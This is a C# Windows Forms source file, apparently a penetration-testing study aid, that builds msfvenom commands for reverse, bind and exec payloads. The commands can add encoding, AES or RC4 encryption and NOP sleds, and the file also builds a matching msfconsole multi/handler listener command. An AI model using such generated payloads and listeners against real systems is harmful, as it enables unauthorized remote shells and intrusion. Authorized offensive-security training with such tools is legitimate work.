using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OSEP_2026
{
    public partial class Form1 : Form
    {
        private MSFVenom msv = new MSFVenom();

        public Form1()
        {
            InitializeComponent();
            UpdateMSFVenomUI();
            UpdatePayloadText();
        }

        private void btnMsvGenerate_Click(object sender, EventArgs e)
        {
            UpdatePayloadText();
            


        }

        private void UpdatePayloadText()
        {
            //Generate Command
            StringBuilder sbGenerator = new StringBuilder();
            sbGenerator.Append($"msfvenom -p {cbMsvPayload.Text} ");
            sbGenerator.Append($"-f {cbMsvOutput.Text} ");

            if (txtMsvFilename.Text.Length >= 1)
            {
                sbGenerator.Append($"-o {txtMsvFilename.Text} ");
            }

            if (cbMsvEncoding.Text != "None")
            {
                sbGenerator.Append($"-e {cbMsvEncoding.Text} ");

                if (numMsvEncIteration.Value >= 1)
                {
                    sbGenerator.Append($"-i {numMsvEncIteration.Value.ToString()} ");
                }
            }

            if (cbMsvEncryption.Text != "None")
            {
                sbGenerator.Append($"--encrypt {cbMsvEncryption.Text} ");

                if (cbMsvEncryption.Text == "aes256")
                {
                    sbGenerator.Append($"--encrypt-key {Utils.GenerateRandomString(32)} ");
                }

                if (cbMsvEncryption.Text == "aes256")
                {
                    sbGenerator.Append($"--encrypt-iv {Utils.GenerateRandomString(16)} ");
                }

                if (cbMsvEncryption.Text == "rc4")
                {
                    sbGenerator.Append($"--encrypt-key {Utils.GenerateRandomString(8)} ");
                }
            }

            if (numMsvNopSled.Value >= 1)
            {
                sbGenerator.Append($"-n {numMsvNopSled.Value.ToString()} ");
            }





            if (cbMsvPayload.Text.Contains("bind"))
            {
                sbGenerator.Append($"LPORT={txtLPORT.Text} ");
            }

            if (cbMsvPayload.Text.Contains("reverse"))
            {
                sbGenerator.Append($"LHOST={txtLHOST.Text} LPORT={txtLPORT.Text} ");
            }

            if (cbMsvPayload.Text.Contains("exec"))
            {
                sbGenerator.Append($"CMD=\"{txtMsvCmd.Text}\"");
            }

            sbGenerator.Append("EXITFUNC=thread");


            //Generate Listener
            StringBuilder sbListener = new StringBuilder();

            if (!cbMsvPayload.Text.Contains("exec"))
            {
                sbListener.Append($"");
                sbListener.Append($"msfconsole -q -x \"use multi/handler; set payload {cbMsvPayload.Text}; ");

                if (cbMsvPayload.Text.Contains("bind"))
                {
                    sbListener.Append($"set rhost {txtRHOST.Text}; set lport {txtLPORT.Text}; ");
                }

                if (cbMsvPayload.Text.Contains("reverse"))
                {
                    sbListener.Append($"set lhost {txtLHOST.Text}; set lport {txtLPORT.Text}; ");
                }

                sbListener.Append("run;\"");


            }




            txtMsvGenerator.Text = sbGenerator.ToString();
            txtMsvListener.Text = sbListener.ToString();
        }

        private void UpdateMSFVenomUI()
        {

            cbMsvPayload.Text = "";
            cbMsvPayload.Items.Clear();
            foreach (MSFVenomPayload msvp in msv.payloads)
            {
                if (rbMsv64.Checked && msvp.Architecture == MSFVenomArch.x64)
                {
                    if (rbMsvStaged.Checked && msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                    else if (rbMsvFull.Checked && !msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                }
                        

                if (rbMsv86.Checked && msvp.Architecture == MSFVenomArch.x86)
                {
                    if (rbMsvStaged.Checked && msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                    else if (rbMsvFull.Checked && !msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                }

            }
            cbMsvPayload.Text = cbMsvPayload.Items[0].ToString();

            UpdatePayloadText();
        }

        private void rbMsv64_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void rbMsv86_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void rbMsvStaged_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void rbMsvFull_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void numMsvEncIteration_ValueChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void cbMsvEncoding_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void cbMsvOutput_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtMsvFilename_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void cbMsvEncryption_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void numMsvNopSled_ValueChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtLHOST_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtRHOST_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtLPORT_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtRPORT_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtUSER_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void txtPASS_TextChanged(object sender, EventArgs e)
        {

        }

        private void txtMsvCmd_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }
    }
}
